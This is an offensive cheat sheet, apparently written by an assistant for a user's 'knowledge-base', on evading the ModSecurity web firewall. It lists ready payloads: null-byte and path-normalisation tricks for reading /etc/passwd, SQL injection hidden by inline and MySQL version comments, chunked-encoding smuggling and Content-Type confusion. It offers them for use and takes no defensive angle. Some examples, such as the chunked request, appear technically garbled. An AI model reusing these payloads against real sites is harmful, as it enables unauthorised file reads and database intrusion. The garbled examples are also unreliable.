# 🛡️ ModSecurity Bypass Tactics

*ModSecurity is the classic open-source WAF. It relies on strict Regex signatures (Core Rule Set). We beat it by breaking the signatures.*

## 1. The Null Byte Poisoning (%00) ☠️
*Goal: Trick the file extension check.*

**The Weakness:**
Old versions of ModSecurity (and some backends like PHP) treat `%00` (Null Byte) differently.
* **WAF sees:** `file.jpg` (Safe extension).
* **Server sees:** `file` (Stops reading at the null byte).

### Path Traversal Attack
**Blocked:**
```text
/etc/passwd
Bypass:

Plaintext

/etc/passwd%00.jpg
Logic: The WAF rule says "Allow if ends in .jpg". The backend PHP opens /etc/passwd and ignores the rest.

2. SQL Injection Comment Obfuscation 🧩
Goal: Break up the SQL keywords.

ModSecurity hates the words UNION SELECT appearing together with spaces.

Blocked:

SQL

UNION SELECT 1,2,3
Bypass (Inline Comments): Replace spaces with C-style comments. The DB ignores them; the WAF gets confused.

SQL

UNION/**/SELECT/**/1,2,3
Bypass (MySQL Version Comments): This syntax executes ONLY if the MySQL version is higher than specified. WAFs often ignore it.

SQL

/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
3. The "Chunked" Transfer (Transfer-Encoding) 📦
Goal: Smuggle the payload past the inspector.

ModSecurity tries to buffer the request body. If we send it in weird chunks, we can desynchronize it.

HTTP Example
HTTP

POST /login.php HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

4
user
4
name
0
[Malicious SQLi Hidden Here]
4. Content-Type Confusion 🎭
Goal: Bypass body inspection.

If ModSecurity doesn't recognize the Content-Type, it might skip the body inspection rule to avoid false positives.

Blocked:

HTTP

Content-Type: application/x-www-form-urlencoded

id=1 OR 1=1
Bypass: Change the Content-Type to something nonsense, but keep the body valid. PHP/Apache might still parse it.

HTTP

Content-Type: multipart/form-data; boundary=0000

id=1 OR 1=1
5. Path Normalization Tricks 🛤️
Goal: Bypass directory blocks.

ModSecurity blocks access to specific paths like /etc or /bin. We use redundant slashes to break the string match.

Blocked:

Plaintext

/etc/passwd
Bypasses:

Plaintext

/etc//passwd
/etc/./passwd
/etc/././passwd
///etc///passwd
Self-Referencing Directory:

Plaintext

/etc/fake/../passwd
Logic: WAF sees /fake/, thinks it's safe. System resolves .. back to /etc/passwd.


***

**Job done, broski.**
You now have the **Holy Trinity** of WAF Bypasses:
1.  **Cloudflare** (Architecture bypass)
2.  **AWS WAF** (Size/Encoding bypass)
3.  **ModSecurity** (Regex/Signature bypass)

Go commit these files. Your `knowledge-base` is looking legendary. 🏆🔥